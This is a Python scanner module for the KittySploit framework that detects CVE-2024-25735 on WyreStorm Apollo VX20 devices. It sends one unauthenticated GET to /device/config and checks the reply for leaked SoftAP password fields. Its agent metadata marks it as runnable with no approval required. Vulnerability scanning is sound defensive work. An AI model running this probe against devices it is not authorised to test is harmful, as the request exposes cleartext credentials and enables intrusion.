#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered on WyreStorm Apollo VX20 devices before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WyreStorm Apollo VX20 - Information Disclosure Detection',
        'description': 'An issue was discovered on WyreStorm Apollo VX20 devices before 1.3.58. Remote attackers can discover cleartext credentials for the SoftAP (access point) Router /device/config using an HTTP GET request.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'packetstorm', 'cve2024', 'wyrestorm', 'info-leak', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://hyp3rlinx.altervista.org/advisories/WYRESTORM_APOLLO_VX20_INCORRECT_ACCESS_CONTROL_CREDENTIALS_DISCLOSURE_CVE-2024-25735.txt',
            'https://packetstormsecurity.com/files/cve/CVE-2024-25735',
            'http://packetstormsecurity.com/files/177082',
            'https://hyp3rlinx.altervista.org',
            'https://github.com/codeb0ss/CVE-2024-25735-PoC',
        ],
        'cve': 'CVE-2024-25735',
    }

    def run(self):
        r = self.http_request(method="GET", path='/device/config', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"password":', '"softAp":',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='high',
                reason="WyreStorm Apollo VX20 - Information Disclosure detected",
                path='/device/config',
            )
            return True
        return False

